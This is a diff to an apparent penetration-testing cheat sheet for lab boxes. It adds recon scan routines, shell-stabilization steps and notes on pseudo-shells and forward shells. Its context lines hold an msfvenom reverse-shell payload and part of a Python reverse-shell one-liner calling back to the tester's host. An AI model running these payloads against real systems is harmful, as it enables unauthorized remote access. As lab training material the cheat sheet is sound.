@@ -44,6 +44,12 @@ sudo nmap -A -p <ports> -oA <hostname>_4-tcp-full-scan <ip_address>   # <ports> 
 rustscan -a <ip_address> --ulimit 5000 -- -sC -sV
 masscan -p1-65535 <ip_address> --rate 10000 -oL masscan.txt
 
+# "Always be running recon": run the slow -p- in a SECOND terminal so it never
+# blocks the scripted scan. Stagger the start so they don't step on each other:
+sleep 300 && sudo nmap -p- --min-rate 10000 -oA <hostname>_3-tcp-discovery <ip_address>
+# Don't skip UDP — SNMP(161)/DNS(53)/TFTP(69) live here and leak creds (the Sneaky lesson).
+# Stuck later? the unsticking playbook (scan what you skipped, re-read notes) is in ~/ippsec.
+
 # Always add the box to /etc/hosts so vhosts/Kerberos resolve:
 echo "<ip_address> <hostname> <domain>" | sudo tee -a /etc/hosts
 ////////////////////////////////////////
@@ -491,8 +497,15 @@ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<your-ip>"
 # Windows payload:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=9001 -f exe -o shell.exe
 
-# Stabilize a dumb shell:
-python3 -c 'import pty;pty.spawn("/bin/bash")'   # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm
+# Stabilize a dumb shell — FIRST thing you do (the `ttyup` helper prints this
+# with your local rows/cols pre-filled; the why/discipline is in ~/ippsec):
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # 1) on target  (or: script -qc /bin/bash /dev/null)
+#   2) Ctrl-Z                                      3) stty raw -echo; fg
+#   4) Enter, then on target:  export TERM=xterm;  stty rows <R> cols <C>   (<R>/<C> from `stty -a` local)
+# Blind/awkward RCE (SSTI, injection, deserialization)? Don't fight for a reverse
+# shell — script a Python cmd.Cmd pseudo-shell instead (IppSec's signature move):
+#   ~/.config/kali/templates/pseudo-shell.py    # copy into exploit/, wire request+regex
+# Firewalled BOTH ways? -> forward shell (mkfifo in /dev/shm | tail -f | sh).  See ~/ippsec (`ipp`).
 
 # File transfer:
 python3 -m http.server 8000                       # serve from attacker
@@ -533,6 +546,8 @@ Reference
 # PayloadsAllTheThings  (revshells, injections — many are in /usr/share already)
 #
 # Companion references in this repo (different altitudes):
+#   offensive/ippsec      (~/ippsec,     `ipp`)   THE METHOD: recon loop, shell stabilization,
+#                                                 scripted pseudo-shell, the unsticking playbook
 #   offensive/exploitdev  (~/exploitdev, `xdev`)   binary exploitation: BOF/SEH/egghunter/ROP
 #   offensive/evasion     (~/evasion,    `evade`)  AV/AMSI/AppLocker evasion, client-side, injection
 #   OFFENSIVE-METHODOLOGY.md   the phase -> ATT&CK -> tool map
